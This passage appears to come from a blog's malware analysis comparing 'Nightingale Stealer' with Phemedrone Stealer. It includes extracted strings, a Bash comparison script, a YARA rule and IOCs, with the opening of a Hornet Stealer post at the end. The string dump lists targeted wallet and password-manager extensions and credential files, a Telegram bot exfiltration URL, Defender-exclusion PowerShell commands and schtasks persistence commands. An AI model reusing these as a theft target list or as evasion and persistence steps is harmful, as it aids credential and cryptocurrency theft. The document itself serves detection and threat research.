Settings\\lfmgcmgkbkphaaggnofnhoonmjfmjhahTronLinkGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofecUniSwapGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\ncljmiffkofogcgiepiflbfhjelkklkbMetaVaultGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\apakagogmckphjnojeblmiaahdnogkniSafePalGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\jcjejccajkejpnadafclaophjfpjebhmChrome_SolletGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnknoChrome_MetamaskGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknnChrome_TonGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfndChrome_XinPayGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofoChrome_MoboxGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmaloChrome_IconexGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfelChrome_GuildGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmjChrome_EqualGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapacChrome_Coin98Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aeachknmefphepccionboohckonoeemgChrome_BitappGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpiChrome_BinanceGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjpChrome_Google_AuthicatorGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbaiChrome_YOROI_WALLETGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajbChrome_NIFTYChrome_MATHGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflcChrome_COINBASEGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaadChrome_EQUALGoogle\\Chrome\\User Data\\Default\\IndexedDB\\chrome-extension_blnieiiffboillknjnepogjhkgnoapac_0.indexeddb.leveldbChrome_WOMBATGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjihChrome_IWALLETGoogle\\Chrome\\User Data\\Default\\Sync Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdmChrome_GUILD1Google\\Chrome\\User Data\\Default\\Sync Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmjChrome_SATURNGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimigChrome_RONINGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneecChrome_NEOLINEGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\cphhlgmgameodnhkjdmkpanlelnlohaoChrome_CLOVERGoogle\\Chrome\\User Data\\Default\\Local Extension Settings\\nhnkbkgjikgcigadomkphalanndcapjkChrome_LIQUALITYEdge_AuvitasMicrosoft\\Edge\\User Data\\Default\\Local Extension Settings\\klfhbdnlcfcaccoakhceodhldjojbogaEdge_MathMicrosoft\\Edge\\User Data\\Default\\Local Extension Settings\\dfeccadlilpndjjohbjdblepmjeahlmmEdge_MetamaskMicrosoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhmEdge_MTVMicrosoft\\Edge\\User Data\\Default\\Local Extension Settings\\oooiblbdpdlecigodndinbpfopomaeglEdge_RabetMicrosoft\\Edge\\User Data\\Default\\Local Extension Settings\\aanjhgiamnacdfnlfnmgehjikagdbafdEdge_RoninMicrosoft\\Edge\\User Data\\Default\\Local Extension Settings\\bblmcdckkhkhfhhpfcchlpalebmonecpEdge_YoroiMicrosoft\\Edge\\User Data\\Default\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcbEdge_ZilpayMicrosoft\\Edge\\User Data\\Default\\Local Extension Settings\\fbekallmnjoeggkefjkbebpineneilecEdge_ExodusMicrosoft\\Edge\\User Data\\Default\\Local Extension Settings\\jdiccldimpdaibmpdkjnbmckianbfold/\\FileZilla\\recentservers.xml\\FileZilla\\sitemanager.xml\\FileZillaFTP/Profileskey3.dbkey4.dbcookies.sqlitemoz_cookiesformhistory.sqlitemoz_formhistoryBrowser Data/Cookies_[].txtBrowser Data/AutoFills_logins.jsonencryptedUsernameencryptedPasswordhostname[^ -]1metaDatapassword2A864886F70D010C050103ISO-8859-1password-check2A864886F70D01050DnssPrivate*.iniglobal-saltVersionUser Data1.0.0.0Local StateNetworkCookiescookiesWeb DataautofillLogin Dataloginscredit_cardsLocal StorageleveldbCreditCards.txtProfile*DefaultAuthenticatorbhghoamapcdpbohphigoooaddinpkbaiEOS AuthenticatoroeljdldpnmdbchonielidgobddffflalBrowserPassnaepdomgkenhinolocfifgehidddafchMYKIbmikpgodpkclnkgmnpphehdgcimmidedSplikityjhfjfclepacoldmjmkmdlmganfaalklbCommonKeychgfefjpcobfbnpmiokfjjaglahmndedZoho VaultigkpcodhieompeloncfnbekccinhapdbNorton Password ManageradmmjipmmciaobhojoghlmleefbicajgAvira Password ManagercaljgklbbfbcjjanaijlacgncafpegllTrezor Password ManagerimloifkgjagghnncjkhggdhalmcnfklkMetaMasknkbihfbeogaeaoehlefnkodbefgpgknnibnejdfjmmkpcnlpebklmnkoeoihofecBinanceChainfhbohimaelbohpjbbldcngcnapndodjpCoin98aeachknmefphepccionboohckonoeemgiWalletkncchdigobghenbbaddojjnnaogfppfjWombatamkmjjmmflddogmhpjloimipbofnfjihMEW CXnlbmnnijcnlegkjjpcfjclmcfggfefdmNeoLinecphhlgmgameodnhkjdmkpanlelnlohaoTerra StationaiifbnbfobpmeekipheeijimdpnlpgppdmkamcknogkgcdfhhbddcghachkejeapSolletfhmfendgdocmcbmfikdcogofphimnknoICONexflpiciilemghbmfalicajoolhkkenfelKHChcflpincpppdclinealmandijcmnkbgnTezBoxmnfifefkajgofkcjkemidiaecocnkjehByonenlgbhdfgdhgbiamfdfmbikcdghidoaddOneKeyilbbpajmiplgpehdikmejfemfklpkmkeTrust WalletpknlccmneadmjbkollckpblgaaabamegMetaWalletpfknkoocfefiocadajpngdknmkjgakdgGuarda WalletfcglfhcjfpkgdppjbglknafgfffkelnmidkppnahnmmggbmfkjhiakkbkdpnmnonJaxx LibertymhonjhhcgphdphdjcdoeodfdliikapmjAtomic WalletbhmlbgebokamljgnceonbncdofmmkedghieplnfojfccegoloniefimmbfjdgcgpMyceliumpidhddgciaponoajdngciiemcflpnnbgCoinomiblbpgcogcoohhngdjafgpoagcilicpjhGreenAddressgflpckpfdgcagnbdfafmibcmkadnlhpjEdgedoljkehcfhidippihgakcihcmnknlphhBRDnbokbjkelpmlgflobbohapifnnenbjlhSamourai WalletapjdnokplgcjkejimjdfjnhmjlbpgkdiCopayieedgmmkpkbiblijbbldefkomatsuahhBreadjifanbgejlbcmhbbdbnfbfnlmbomjedjAirbitzKeepKeydojmlmceifkfgkgeejemfciibjehhdclTrezorjpxupxjxheguvfyhfhahqvxvyqthiryhLedger LivepfkcfdjnlfjcmkjnhcbfhfkkoflnhjlnLedger WallethbpfjlflhnmkddbjdchbbifhllgmmhnmBitboxocmfilhakdbncmojmlbagpkjfbmeinbdDigital BitboxdbhklojmlkgmpihhdooibnmidfpeaingYubiKeymammpjaaoinfelloncbbpomjcihbkmmcGoogle AuthenticatorkhcodhlfkpmhibicdjjblnkgimdepgndMicrosoft AuthenticatorbfbdnbpibgndpjfhonkflpkijfapmomnAuthygjffdbjndmcafeoehgdldobgjmlepcalDuo MobileeidlicjlkaiefdbgmdepmmicpbggmhojOTP AuthbobfejfdlhnabgglompioclndjejolchFreeOTPelokfmmmjbadpgdjmgglocapdckdcpknAegis AuthenticatorppdjlkfkedmidmclhakfncpfdmdgmjpmLastPass AuthenticatorcfoajccjibkjhbdjnpkbananbejpkkjbDashlaneflikjlpgnpcjdienoojmgliechmmheekKeepergofhklgdnbnpcdigdgkgfobhhghjmmkjRoboFormhppmchachflomkejbhofobganapojjolKeePasslbfeahdfdkibininjgejjgpdafeopflbKeePassXCkgeohlebpjgcfiidfhhdlnnkhefajmcaBitwardeninljaljiffkdgmlndjkdiepghpolcpkiNordPassnjgnlkhcjgmjfnfahdmfkalpjcneebplLastPassgabedfkgnbglfbnplfpjddgfnbibkmbbLocal Extension SettingsBrowser Data/Extensions/_Module Info CacheLast Version*cord*FileGrabberIP:queryCountry:countrycountryCodeCity:cityPostal:zipMAC:Username:Windows name:x32x64Hardware ID:GPU:{0,-25}CPU:RAM:Passwords:Cookies:Credit Cards:AutoFills:ExtensionsWallets:Files:Passwrods Tags:, Cookies Tags:Antivirus products:File Location:unknownInformation.txtTTTTT\\.Unknown()-Nightingale-Report.ziphttp://ip-api.com/json/?fields=11827root\\SecurityCenter2edisplayNameX2:MemoryAvailable ByteseNameeeTotalPhysicalMemory0Win32_ProcessorProcessorIdWin32_DiskDriveSerialNumbereHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersionProductNameuser32.dllGetDCgdi32.dllGetDeviceCapsScreenshot.png*ssfn*\\config*.vdfSteam/HKEY_CURRENT_USER\\Software\\Valve\\SteamSteamPathroot\\CIMV2yyyy-MM-dd h:mm:ss ttHKEY_CLASSES_ROOT\\tg\\DefaultIcontdatasusertagsettingskey_dataprefixMessengers/TGgoods/filefilenamefiledescriptionPOST----------------------------xmultipart/form-data; boundary=Content-Disposition: form-data; name=&quot;&quot;; filename=&quot;&quot;Content-Type: application/octet-streamInvalid IP address or port number. Unable to send the data.Invalid argument format. Unable to send the data..ziphttps://api.telegram.org/bot{0}/sendDocumentdocumentchat_idparse_modeMarkdownV2captionwiresharkhttpdebbugeruiVirtualBoxVBoxVMware VirtualVMwareHyper-V Videoru-RUuk-UAkk-KZro-MDuz-UZbe-BYaz-Latn-AZhy-AMky-KGtg-Cyrl-TJSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunSystemcmd/k start /b powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath &amp;amp; exit/k start /b powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionExtension .exe &amp;amp; exitschtasks.exe/create /tn {0} /tr &quot;{1}&quot; /sc MINUTE /mo {2} /ru &quot;System&quot; /F/create /tn /tr &quot;&quot; /sc ONLOGON /ru &quot;System&quot; /FTGgoods{0} {1} {2} {3} {4} {5} {6}Name: Value: Hostname: Username: Password: Browser: v (Number: {0}Placeholder: {1}Expiration: {2}/{3}Browser: {4} v{5} ({6})*.ldbencrypted_keyDPAPIroblox.comsteampowered.comgenshinepicgames.comfortnite.comGAMESqiwitinkoffyoomoneysberbankBANKfacebookFACEBOOKfunpaypaypalamericanexpressamazonMONEYspotifymusic.appleMUSICdeadcodecelkanursultanakrienexpenisvewexsidex.synapsesynapseneverlosegamesensenixwareprimordialinteriumxoneCHEATSdQw4w9WgXcQ:[^&quot;]*dQw4w9WgXcQ:eParentProcessIdUNIQUEWriting is not allowedv1bcrypt.dllBCryptDecryptBCryptDestroyKeyBCryptCloseAlgorithmProviderAESMicrosoft Primitive ProviderChainingModeGCMBCryptOpenAlgorithmProviderBCryptSetPropertyChainingModeAuthTagLengthBCryptImportKeyObjectLengthKeyDataBlobBCryptGetPropertycrypt32.dllCryptUnprotectDataalgorithmAlgorithm cannot be null.Password cannot be null.saltSalt cannot be null.Derived key too long.SEQUENCE {{0:X2} INTEGER OCTETSTRING OBJECTIDENTIFIER }00061561Part 4 - Nightingale Stealer vs Phemedrone StealerAt the beginning of this article, we noticed that the Nightingale Stealer sample was labeled as Phemedrone Stealer by crowdsourced YARA rules. In this section, we’ll explore why this identification occurred.To achieve this, we will obtain the source code of Phemedrone Stealer. Subsequently, we will systematically compare each extracted string from Nightingale Stealer with the source code of Phemedrone Stealer. This comparative analysis will provide insights into the extent of similarity between the two.To minimize the chances of false positive matches, we initiated the process by compiling a list of strings with three or more characters. Following this, we implemented a Bash script designed for the comparative analysis.#!/bin/bashdeclare -A matchedStringswhile IFS= read -r line; do if grep -qr --include=&quot;*&quot; &quot;$line&quot; Phemedrone-Stealer-master/; then if [ -z &quot;${matchedStrings[$line]}&quot; ]; then echo &quot;Matched: &#39;${line}&#39;&quot; matchedStrings[$line]=1 fi fidone &amp;lt; strings.txtUpon executing the script, we identified a total of 328 matching strings present in both Nightingale Stealer and Phemedrone Stealer.Matched strings;Matched: &#39;*.dat&#39;Matched: &#39;*.ini&#39;Matched: &#39;*.ldb&#39;Matched: &#39;*.mafile&#39;Matched: &#39;*.txt&#39;Matched: &#39;*.vdf&#39;Matched: &#39;*cord*&#39;Matched: &#39;*seed*&#39;Matched: &#39;*ssfn*&#39;Matched: &#39;00061561&#39;Matched: &#39;1.0.0.0&#39;Matched: &#39;2A864886F70D01050D&#39;Matched: &#39;2A864886F70D010C050103&#39;Matched: &#39;8.8.8.8&#39;Matched: &#39;Aegis Authenticator&#39;Matched: &#39;Airbitz&#39;Matched: &#39;Algorithm cannot be null.&#39;Matched: &#39;Antivirus products:&#39;Matched: &#39;Armory&#39;Matched: &#39;Atomic&#39;Matched: &#39;Atomic Wallet&#39;Matched: &#39;AuthTagLength&#39;Matched: &#39;Authenticator&#39;Matched: &#39;Authy&#39;Matched: &#39;AutoFills:&#39;Matched: &#39;Available Bytes&#39;Matched: &#39;Avira Password Manager&#39;Matched: &#39;BCryptCloseAlgorithmProvider&#39;Matched: &#39;BCryptDecrypt&#39;Matched: &#39;BCryptDestroyKey&#39;Matched: &#39;BCryptGetProperty&#39;Matched: &#39;BCryptImportKey&#39;Matched: &#39;BCryptOpenAlgorithmProvider&#39;Matched: &#39;BCryptSetProperty&#39;Matched: &#39;BinanceChain&#39;Matched: &#39;Bitbox&#39;Matched: &#39;Bitwarden&#39;Matched: &#39;Bread&#39;Matched: &#39;Browser Data/AutoFills_&#39;Matched: &#39;Browser Data/Cookies_&#39;Matched: &#39;Browser Data/Extensions/&#39;Matched: &#39;Browser: &#39;Matched: &#39;BrowserPass&#39;Matched: &#39;Byone&#39;Matched: &#39;Bytecoin&#39;Matched: &#39;CHEATS&#39;Matched: &#39;Catalyst&#39;Matched: &#39;ChainingMode&#39;Matched: &#39;ChainingModeGCM&#39;Matched: &#39;Chat ID&#39;Matched: &#39;City:&#39;Matched: &#39;Coin98&#39;Matched: &#39;Coinomi&#39;Matched: &#39;CommonKey&#39;Matched: &#39;Coninomi&#39;Matched: &#39;Content-Type: application/octet-stream&#39;Matched: &#39;Cookies&#39;Matched: &#39;Cookies Tags:&#39;Matched: &#39;Cookies:&#39;Matched: &#39;Copay&#39;Matched: &#39;Country:&#39;Matched: &#39;Credit Cards:&#39;Matched: &#39;CreditCards.txt&#39;Matched: &#39;CryptUnprotectData&#39;Matched: &#39;DPAPI&#39;Matched: &#39;Dashlane&#39;Matched: &#39;Default&#39;Matched: &#39;Derived key too long.&#39;Matched: &#39;Digital Bitbox&#39;Matched: &#39;Duo Mobile&#39;Matched: &#39;EOS Authenticator&#39;Matched: &#39;Electrum&#39;Matched: &#39;Exodus&#39;Matched: &#39;Extensions&#39;Matched: &#39;File Location:&#39;Matched: &#39;FileGrabber&#39;Matched: &#39;Files:&#39;Matched: &#39;FreeOTP&#39;Matched: &#39;GAMES&#39;Matched: &#39;GetDC&#39;Matched: &#39;GetDeviceCaps&#39;Matched: &#39;Google Authenticator&#39;Matched: &#39;GreenAddress&#39;Matched: &#39;Guarda&#39;Matched: &#39;Guarda Wallet&#39;Matched: &#39;Hardware ID:&#39;Matched: &#39;Hostname: &#39;Matched: &#39;Hyper-V Video&#39;Matched: &#39;ICONex&#39;Matched: &#39;ISO-8859-1&#39;Matched: &#39;Information.txt&#39;Matched: &#39;Jaxx Liberty&#39;Matched: &#39;KeePass&#39;Matched: &#39;KeePassXC&#39;Matched: &#39;KeepKey&#39;Matched: &#39;Keeper&#39;Matched: &#39;Keplr&#39;Matched: &#39;KeyDataBlob&#39;Matched: &#39;Last Version&#39;Matched: &#39;LastPass&#39;Matched: &#39;LastPass Authenticator&#39;Matched: &#39;Ledger Live&#39;Matched: &#39;Ledger Wallet&#39;Matched: &#39;Local Extension Settings&#39;Matched: &#39;Local State&#39;Matched: &#39;Local Storage&#39;Matched: &#39;Login Data&#39;Matched: &#39;MEW CX&#39;Matched: &#39;MONEY&#39;Matched: &#39;MUSIC&#39;Matched: &#39;MarkdownV2&#39;Matched: &#39;Memory&#39;Matched: &#39;MetaMask&#39;Matched: &#39;MetaWallet&#39;Matched: &#39;Microsoft Authenticator&#39;Matched: &#39;Microsoft Primitive Provider&#39;Matched: &#39;Module Info Cache&#39;Matched: &#39;Mycelium&#39;Matched: &#39;Name: &#39;Matched: &#39;NeoLine&#39;Matched: &#39;Network&#39;Matched: &#39;NordPass&#39;Matched: &#39;Norton Password Manager&#39;Matched: &#39;OTP Auth&#39;Matched: &#39;ObjectLength&#39;Matched: &#39;OneKey&#39;Matched: &#39;Panel&#39;Matched: &#39;ParentProcessId&#39;Matched: &#39;Password cannot be null.&#39;Matched: &#39;Password.txt&#39;Matched: &#39;Password: &#39;Matched: &#39;Passwords:&#39;Matched: &#39;Postal:&#39;Matched: &#39;ProcessorId&#39;Matched: &#39;ProductName&#39;Matched: &#39;Profile*&#39;Matched: &#39;Profiles&#39;Matched: &#39;RoboForm&#39;Matched: &#39;SEQUENCE {&#39;Matched: &#39;Salt cannot be null.&#39;Matched: &#39;Samourai Wallet&#39;Matched: &#39;Screenshot.png&#39;Matched: &#39;SerialNumber&#39;Matched: &#39;Sollet&#39;Matched: &#39;Splikity&#39;Matched: &#39;Steam/&#39;Matched: &#39;SteamPath&#39;Matched: &#39;System&#39;Matched: &#39;Telegram&#39;Matched: &#39;Terra Station&#39;Matched: &#39;TezBox&#39;Matched: &#39;Token&#39;Matched: &#39;TotalPhysicalMemory&#39;Matched: &#39;Trezor&#39;Matched: &#39;Trezor Password Manager&#39;Matched: &#39;TronLink&#39;Matched: &#39;Trust Wallet&#39;Matched: &#39;UNIQUE&#39;Matched: &#39;Unknown&#39;Matched: &#39;User Data&#39;Matched: &#39;Username:&#39;Matched: &#39;Username: &#39;Matched: &#39;VMware&#39;Matched: &#39;VMware Virtual&#39;Matched: &#39;Value: &#39;Matched: &#39;Version&#39;Matched: &#39;VirtualBox&#39;Matched: &#39;Wallets/&#39;Matched: &#39;Wallets:&#39;Matched: &#39;Web Data&#39;Matched: &#39;Win32_DiskDrive&#39;Matched: &#39;Win32_Processor&#39;Matched: &#39;Windows name:&#39;Matched: &#39;Wombat&#39;Matched: &#39;Writing is not allowed&#39;Matched: &#39;YubiKey&#39;Matched: &#39;Zoho Vault&#39;Matched: &#39;[^ -]&#39;Matched: &#39;\\FileZilla&#39;Matched: &#39;\\config&#39;Matched: &#39;].txt&#39;Matched: &#39;admmjipmmciaobhojoghlmleefbicajg&#39;Matched: &#39;aeachknmefphepccionboohckonoeemg&#39;Matched: &#39;aiifbnbfobpmeekipheeijimdpnlpgpp&#39;Matched: &#39;akrien&#39;Matched: &#39;algorithm&#39;Matched: &#39;amazon&#39;Matched: &#39;americanexpress&#39;Matched: &#39;amkmjjmmflddogmhpjloimipbofnfjih&#39;Matched: &#39;apjdnokplgcjkejimjdfjnhmjlbpgkdi&#39;Matched: &#39;autofill&#39;Matched: &#39;az-Latn-AZ&#39;Matched: &#39;bcrypt.dll&#39;Matched: &#39;be-BY&#39;Matched: &#39;bfbdnbpibgndpjfhonkflpkijfapmomn&#39;Matched: &#39;bhghoamapcdpbohphigoooaddinpkbai&#39;Matched: &#39;bhmlbgebokamljgnceonbncdofmmkedg&#39;Matched: &#39;blbpgcogcoohhngdjafgpoagcilicpjh&#39;Matched: &#39;bmikpgodpkclnkgmnpphehdgcimmided&#39;Matched: &#39;bobfejfdlhnabgglompioclndjejolch&#39;Matched: &#39;bytecoin&#39;Matched: &#39;caljgklbbfbcjjanaijlacgncafpegll&#39;Matched: &#39;caption&#39;Matched: &#39;celka&#39;Matched: &#39;cfoajccjibkjhbdjnpkbananbejpkkjb&#39;Matched: &#39;chat_id&#39;Matched: &#39;chgfefjpcobfbnpmiokfjjaglahmnded&#39;Matched: &#39;cmd.exe&#39;Matched: &#39;cookies&#39;Matched: &#39;cookies.sqlite&#39;Matched: &#39;country&#39;Matched: &#39;countryCode&#39;Matched: &#39;cphhlgmgameodnhkjdmkpanlelnlohao&#39;Matched: &#39;credit_cards&#39;Matched: &#39;crypt32.dll&#39;Matched: &#39;dQw4w9WgXcQ:&#39;Matched: &#39;dQw4w9WgXcQ:[^&quot;]*&#39;Matched: &#39;dbhklojmlkgmpihhdooibnmidfpeaing&#39;Matched: &#39;displayName&#39;Matched: &#39;dmkamcknogkgcdfhhbddcghachkejeap&#39;Matched: &#39;document&#39;Matched: &#39;dojmlmceifkfgkgeejemfciibjehhdcl&#39;Matched: &#39;doljkehcfhidippihgakcihcmnknlphh&#39;Matched: &#39;eidlicjlkaiefdbgmdepmmicpbggmhoj&#39;Matched: &#39;elokfmmmjbadpgdjmgglocapdckdcpkn&#39;Matched: &#39;encryptedPassword&#39;Matched: &#39;encryptedUsername&#39;Matched: &#39;encrypted_key&#39;Matched: &#39;epicgames.com&#39;Matched: &#39;false&#39;Matched: &#39;fcglfhcjfpkgdppjbglknafgfffkelnm&#39;Matched: &#39;fhbohimaelbohpjbbldcngcnapndodjp&#39;Matched: &#39;fhmfendgdocmcbmfikdcogofphimnkno&#39;Matched: &#39;filedescription&#39;Matched: &#39;filename&#39;Matched: &#39;flikjlpgnpcjdienoojmgliechmmheek&#39;Matched: &#39;flpiciilemghbmfalicajoolhkkenfel&#39;Matched: &#39;formhistory.sqlite&#39;Matched: &#39;funpay&#39;Matched: &#39;gabedfkgnbglfbnplfpjddgfnbibkmbb&#39;Matched: &#39;gamesense&#39;Matched: &#39;gdi32.dll&#39;Matched: &#39;genshin&#39;Matched: &#39;gflpckpfdgcagnbdfafmibcmkadnlhpj&#39;Matched: &#39;gjffdbjndmcafeoehgdldobgjmlepcal&#39;Matched: &#39;global-salt&#39;Matched: &#39;gofhklgdnbnpcdigdgkgfobhhghjmmkj&#39;Matched: &#39;hbpfjlflhnmkddbjdchbbifhllgmmhnm&#39;Matched: &#39;hcflpincpppdclinealmandijcmnkbgn&#39;Matched: &#39;hieplnfojfccegoloniefimmbfjdgcgp&#39;Matched: &#39;hostname&#39;Matched: &#39;hppmchachflomkejbhofobganapojjol&#39;Matched: &#39;http://ip-api.com/json/?fields=11827&#39;Matched: &#39;httpdebbugerui&#39;Matched: &#39;hy-AM&#39;Matched: &#39;iWallet&#39;Matched: &#39;ibnejdfjmmkpcnlpebklmnkoeoihofec&#39;Matched: &#39;idkppnahnmmggbmfkjhiakkbkdpnmnon&#39;Matched: &#39;ieedgmmkpkbiblijbbldefkomatsuahh&#39;Matched: &#39;igkpcodhieompeloncfnbekccinhapdb&#39;Matched: &#39;ilbbpajmiplgpehdikmejfemfklpkmke&#39;Matched: &#39;imloifkgjagghnncjkhggdhalmcnfklk&#39;Matched: &#39;inljaljiffkdgmlndjkdiepghpolcpki&#39;Matched: &#39;interium&#39;Matched: &#39;jhfjfclepacoldmjmkmdlmganfaalklb&#39;Matched: &#39;jifanbgejlbcmhbbdbnfbfnlmbomjedj&#39;Matched: &#39;jpxupxjxheguvfyhfhahqvxvyqthiryh&#39;Matched: &#39;key3.db&#39;Matched: &#39;key4.db&#39;Matched: &#39;key_data&#39;Matched: &#39;kgeohlebpjgcfiidfhhdlnnkhefajmca&#39;Matched: &#39;khcodhlfkpmhibicdjjblnkgimdepgnd&#39;Matched: &#39;kk-KZ&#39;Matched: &#39;kncchdigobghenbbaddojjnnaogfppfj&#39;Matched: &#39;ky-KG&#39;Matched: &#39;lbfeahdfdkibininjgejjgpdafeopflb&#39;Matched: &#39;leveldb&#39;Matched: &#39;logins&#39;Matched: &#39;logins.json&#39;Matched: &#39;mammpjaaoinfelloncbbpomjcihbkmmc&#39;Matched: &#39;metaData&#39;Matched: &#39;mhonjhhcgphdphdjcdoeodfdliikapmj&#39;Matched: &#39;mnfifefkajgofkcjkemidiaecocnkjeh&#39;Matched: &#39;moz_cookies&#39;Matched: &#39;moz_formhistory&#39;Matched: &#39;multipart/form-data; boundary=&#39;Matched: &#39;music.apple&#39;Matched: &#39;naepdomgkenhinolocfifgehidddafch&#39;Matched: &#39;nbokbjkelpmlgflobbohapifnnenbjlh&#39;Matched: &#39;neverlose&#39;Matched: &#39;nixware&#39;Matched: &#39;njgnlkhcjgmjfnfahdmfkalpjcneebpl&#39;Matched: &#39;nkbihfbeogaeaoehlefnkodbefgpgknn&#39;Matched: &#39;nlbmnnijcnlegkjjpcfjclmcfggfefdm&#39;Matched: &#39;nlgbhdfgdhgbiamfdfmbikcdghidoadd&#39;Matched: &#39;nssPrivate&#39;Matched: &#39;nursultan&#39;Matched: &#39;ocmfilhakdbncmojmlbagpkjfbmeinbd&#39;Matched: &#39;oeljdldpnmdbchonielidgobddffflal&#39;Matched: &#39;parse_mode&#39;Matched: &#39;password&#39;Matched: &#39;password-check&#39;Matched: &#39;paypal&#39;Matched: &#39;pfkcfdjnlfjcmkjnhcbfhfkkoflnhjln&#39;Matched: &#39;pfknkoocfefiocadajpngdknmkjgakdg&#39;Matched: &#39;pidhddgciaponoajdngciiemcflpnnbg&#39;Matched: &#39;pknlccmneadmjbkollckpblgaaabameg&#39;Matched: &#39;ppdjlkfkedmidmclhakfncpfdmdgmjpm&#39;Matched: &#39;prefix&#39;Matched: &#39;query&#39;Matched: &#39;ro-MD&#39;Matched: &#39;ru-RU&#39;Matched: &#39;sberbank&#39;Matched: &#39;settings&#39;Matched: &#39;spotify&#39;Matched: &#39;steampowered.com&#39;Matched: &#39;tdata&#39;Matched: &#39;tg-Cyrl-TJ&#39;Matched: &#39;tinkoff&#39;Matched: &#39;uk-UA&#39;Matched: &#39;unknown&#39;Matched: &#39;user32.dll&#39;Matched: &#39;usertag&#39;Matched: &#39;uz-UZ&#39;Matched: &#39;wallet.dat&#39;Matched: &#39;wireshark&#39;Matched: &#39;yoomoney&#39;Matched: &#39;{0:X2}&#39;Our analysis strongly suggests that Nightingale Stealer is, in essence, an edited version of Phemedrone Stealer. It appears that the threat actor behind Nightingale Stealer made minimal alterations, primarily changing a few strings to ‘Nightingale’ and customizing certain features.This discovery helps clarify why crowdsourced YARA rules initially identified this sample as Phemedrone Stealer, despite the presence of ‘Nightingale’ strings within it.Part 5 - Yara RuleAfter an extensive analysis, it has become evident that Nightingale Stealer is, in fact, a variant of Phemedrone Stealer. Given this discovery, rather than creating new YARA rules for essentially the same malware source code, we can leverage the crowdsourced YARA rules originally designed for Phemedrone Stealer.import &quot;pe&quot;rule MALWARE_Win_PhemedroneStealer{ meta: author = &quot;ditekSHen&quot; description = &quot;Detects Phemedrone Stealer infostealer&quot; os = &quot;windows&quot; filetype = &quot;executable&quot; strings: $p1 = /\\{ file = \\{(0|file)\\}, data = \\{(1|data)\\} \\}/ ascii wide $p2 = &quot;{ &amp;lt;&amp;gt;h__TransparentIdentifier0 = {0}, match = {1} }&quot; wide $p3 = &quot;{ &amp;lt;&amp;gt;h__TransparentIdentifier1 = {0}, encrypted = {1} }&quot; wide $p4 = &quot;{&amp;lt;&amp;gt;h__TransparentIdentifier0}, match = {match} }&quot; ascii $p5 = &quot;{&amp;lt;&amp;gt;h__TransparentIdentifier1}, encrypted = {encrypted} }&quot; ascii $s1 = &quot;&amp;lt;KillDebuggers&amp;gt;b__&quot; ascii $s2 = &quot;&amp;lt;ParseExtensions&amp;gt;b__&quot; ascii $s3 = &quot;&amp;lt;ParseDiscordTokens&amp;gt;b__&quot; ascii $s4 = &quot;&amp;lt;IsVM&amp;gt;b__&quot; ascii $s5 = &quot;&amp;lt;Key3Database&amp;gt;b__&quot; ascii $s6 = &quot;masterPass&quot; ascii $s7 = &quot;rootLocation&quot; ascii $s8 = &quot;rgsServiceNames&quot; ascii $s9 = &quot;rgsFilenames&quot; ascii condition: uint16(0)==0x5a4d and (( all of ($p*) and 3 of ($s*)) or (3 of ($p*) and 4 of ($s*)) or (7 of ($s*)))}Part 6 - IOCs0cc6d724ac017163b40866c820fd67df6ac89924a623490ec1de2ecacf1d02191fdd63b4b1db9637871a4f574c746980977accf2a0f6c3ceaef82b6641a3e9e7kinggru.duckdns.orgReferences https://twitter.com/suyog41/status/1751930165230469619 https://hackforums.net/showthread.php?tid=6258265 https://github.com/kid0604/yara-rules/blob/e6adc1c81e0698b6c349e78148bffa78c5ed7c5b/executable_windows/4334482e8e93d3407716ad54a0a3988e60a02eb6.yarI utilized AI assistance to fine-tune certain sentences in this post, enhancing clarity and precision." }, { "title": "Hunt and Analysis - Hornet Stealer", "url": "/posts/hornet-stealer-analysis/", "categories": "Reverse Engineering, Malware Hunting", "tags": "reverse engineering, malware hunting", "date": "2024-01-29 19:00:00 +0300", "snippet": "Part 1 - Hornet StealerOn January 24th, the Twitter account @spamhaus posted a tweet regarding a newly discovered C2 panel. Based on the panel’s logo and name, they have identified this malware as Hornet Stealer.According to @spamhaus’s tweets, Hornet Stealer, which is downloaded via Smokeloader, is written in Golang. It targets several 